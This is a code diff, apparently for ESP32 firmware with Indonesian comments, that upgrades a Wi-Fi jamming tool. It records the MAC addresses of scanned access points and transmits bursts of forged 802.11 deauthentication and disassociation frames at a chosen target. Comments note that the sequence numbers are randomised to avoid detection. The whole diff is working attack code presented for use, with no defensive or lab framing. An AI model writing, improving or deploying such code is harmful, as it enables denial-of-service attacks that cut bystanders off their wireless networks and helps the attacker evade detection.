@@ -1,5 +1,7 @@
 #include "esp_wifi.h"
 
+
+
 // Fungsi sakti buat ubah String MAC ke Bytes
 void stringToMac(String macStr, uint8_t *macAddr) {
   for (int i = 0; i < 6; i++) {
@@ -7,15 +9,9 @@ void stringToMac(String macStr, uint8_t *macAddr) {
   }
 }
 
-// Paket Deauth Mentah
-uint8_t deauthPacket[26] = {
-    0xC0, 0x00, 0x00, 0x00, 
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Target)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Target)
-    0x00, 0x00, 0x01, 0x00              
-};
-
+// --- TEMPLATE PAKET ALA GHOST-ESP ---
+uint8_t deauthFrame[26] = { 0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
+uint8_t disasFrame[26]  = { 0xa0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
 
 void loopWiFi(void * pvParameters) {
   for(;;) {
@@ -40,31 +36,43 @@ void loopWiFi(void * pvParameters) {
         listWiFi[i].ssid = WiFi.SSID(i);
         listWiFi[i].rssi = WiFi.RSSI(i);
         listWiFi[i].channel = WiFi.channel(i);
+        listWiFi[i].mac = WiFi.BSSIDstr(i); // Ambil MAC target
+
       }
       
       sedang_scan = false;
       scanDone = true;     // Lapor ke Core 1 kalau udah beres
       triggerScan = false; // Matiin pelatuknya
     } else if (isDeauthing && adaTarget) {
-      uint8_t targetMac[6];
-      stringToMac(targetTerkunci.mac, targetMac);
-      
-      memcpy(&deauthPacket[10], targetMac, 6);
-      memcpy(&deauthPacket[16], targetMac, 6);
-      
-      esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
-      
-      // TEMBAK BANYAK SEKALIGUS (Satu Batch)
-      for(int i=0; i<30; i++) { 
-        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
-        // Jeda super mikro biar radio gak panas tapi tetep kenceng
-        delayMicroseconds(500); 
-      }
-      
-      // JEDA AGAK LAMA (Biar Core 0 bisa lapor ke Watchdog & Layar tetep mulus)
-      // 100ms udah cukup buat bikin sistem stabil tapi serangan tetep kerasa
-      vTaskDelay(100 / portTICK_PERIOD_MS); 
+    uint8_t targetMac[6];
+    stringToMac(targetTerkunci.mac, targetMac);
+    
+    // Set Destination (Korban) & Source/BSSID (Router)
+    memcpy(&deauthFrame[4], targetMac, 6);
+    memcpy(&deauthFrame[10], targetMac, 6); // Anggap BSSID sama dengan Target (Broadcast mode)
+    memcpy(&deauthFrame[16], targetMac, 6);
+    
+    memcpy(&disasFrame[4], targetMac, 6);
+    memcpy(&disasFrame[10], targetMac, 6);
+    memcpy(&disasFrame[16], targetMac, 6);
+
+    esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
+
+    // BURST MODE ALA GHOST-ESP (Tembak 2 jenis paket)
+    for(int i=0; i<20; i++) {
+        // Kasih Sequence Number Acak biar gak kedeteksi
+        uint16_t seq = (uint16_t)(esp_random() & 0xFFFF);
+        deauthFrame[22] = seq & 0xFF;
+        deauthFrame[23] = (seq >> 8) & 0xFF;
+        
+        esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
+        esp_wifi_80211_tx(WIFI_IF_STA, disasFrame, sizeof(disasFrame), false);
+        
+        delayMicroseconds(200); 
     }
+    
+    vTaskDelay(50 / portTICK_PERIOD_MS); 
+}
 
     
      // Core 0 istirahat 50ms biar gak overheat sambil nunggu perintah
